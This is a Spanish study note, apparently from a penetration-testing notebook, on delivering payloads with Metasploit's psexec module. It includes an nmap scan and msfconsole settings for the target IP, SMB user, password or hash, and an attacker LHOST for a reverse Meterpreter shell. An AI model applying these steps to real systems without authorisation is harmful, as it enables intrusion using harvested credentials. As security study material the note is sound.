---
tags:
  - metasploit
  - payload
  - delivery
---
## Conceptos Clave (TL;DR)

* [Metasploit](../../../%F0%9F%93%81%2003_Explotacion_y_Acceso_Inicial/Shells%20&%20Payloads/Payloads/Metasploit.md) es un framework automatizado que utiliza módulos preconstruidos para explotar vulnerabilidades y entregar payloads para obtener acceso a sistemas.
* Meterpreter es el payload por defecto de Metasploit; funciona de manera sigilosa mediante la inyección de una DLL en memoria para establecer un canal de comunicación.
* El módulo `psexec` ejecuta payloads arbitrarios utilizando credenciales de administrador válidas (contraseña o hash), creando un servicio con nombre aleatorio que luego intenta limpiar.

### Herramientas Clave

* **msfconsole**: La interfaz principal de línea de comandos para interactuar con el framework de Metasploit.
* **msfvenom**: Utilidad empleada para crear y construir payloads personalizados.
* [**Nmap**](../../../%F0%9F%93%81%2003_Explotacion_y_Acceso_Inicial/Shells%20&%20Payloads/Payloads/brain-not-braining/%F0%9F%93%82%2008_Herramientas_y_Cheatsheets/Nmap.md): Escáner utilizado para enumerar el sistema operativo y los puertos abiertos del objetivo para identificar vectores de ataque.

### Metodología Paso a Paso

1. **Fase 1: Enumeración Inicial**    Antes de usar Metasploit, se escanea el objetivo para descubrir servicios y puertos (ej. SMB en el puerto 445) que ayuden a determinar el sistema operativo y seleccionar el módulo apropiado.
2. **Fase 2: Búsqueda y Selección del Módulo**    Con el vector identificado, se busca en la base de datos de Metasploit exploits asociados al servicio y se selecciona el módulo deseado según la plataforma objetivo.
3. **Fase 3: Configuración de Parámetros**    Se revisan las opciones requeridas por el exploit y el payload. Es necesario establecer parámetros clave como la IP objetivo, la IP atacante (para la reverse shell), recursos compartidos y credenciales recolectadas.
4. **Fase 4: Explotación y Control**    Se lanza el ataque. Si es exitoso, el payload se entrega y se establece una sesión. Se puede interactuar con el entorno Meterpreter o solicitar una shell de comandos nativa del sistema objetivo.

### Cheat Sheet de Comandos

```bash
# Escaneo agresivo evadiendo descubrimiento de host, con detección de versión y scripts por defecto para enumerar servicios y OS
nmap -sC -sV -Pn <TARGET_IP>
  

# Iniciar la consola de Metasploit con privilegios administrativos
sudo msfconsole
  

# Recargar un módulo personalizado si se ha modificado el código base
reload
  

# Buscar módulos relacionados con un servicio específico (ej. SMB)
search <SERVICE_NAME>
  

# Seleccionar un módulo de la lista de búsqueda por su número de índice relativo
use <MODULE_INDEX_NUMBER>
  

# Ver todas las opciones de configuración requeridas y opcionales para el módulo y payload actuales
options
  

# Configurar la dirección IP del sistema objetivo
set RHOSTS <TARGET_IP>
  

# Configurar el recurso compartido administrativo al cual conectarse
set SHARE <ADMIN_SHARE_NAME>
  

# Configurar la contraseña o el hash del usuario para la autenticación
set SMBPass <PASSWORD_OR_HASH>
 

# Configurar el nombre de usuario para la autenticación en el servicio
set SMBUser <USER>
  

# Configurar la IP del atacante (local host o interfaz VPN) para recibir la conexión reversa
set LHOST <ATTACKER_IP>
 

# Ejecutar el módulo configurado e iniciar el intento de explotación
exploit
```

```bash
# -- Comandos Post-Explotación (Meterpreter) --


# Mostrar el menú de ayuda con la lista de comandos disponibles en la sesión de Meterpreter
?

  
# Escapar del entorno limitado de Meterpreter y obtener una shell interactiva nativa del sistema operativo objetivo
shell
```

### "Gotchas" y Troubleshooting

* **Índices de búsqueda dinámicos:** Los números asignados a los módulos a la izquierda en los resultados del comando `search` son relativos a la búsqueda actual; cambiarán dependiendo de la base de datos y no se debe depender de ellos para automatización a largo plazo.
* **Requisito del recurso `ADMIN$`:** Para módulos como `psexec`, el ataque suele implicar la carga de un ejecutable en el recurso compartido administrativo por defecto, por lo que es vital configurar el `SHARE` como `ADMIN$`.
* **Limitaciones de la shell:** La sesión de Meterpreter ofrece funcionalidades avanzadas en memoria, pero tiene limitaciones respecto a los comandos base del sistema; si se requiere ejecutar comandos nativos puros (ej. binarios de Windows nativos), es mandatorio usar el comando `shell`.
* **Responsabilidad y limpieza:** El uso de herramientas sin entender su funcionamiento es peligroso en entornos en vivo. Herramientas como `psexec` alteran el objetivo instalando servicios, aunque las versiones modernas en Metasploit intentan eliminar su rastro automáticamente.
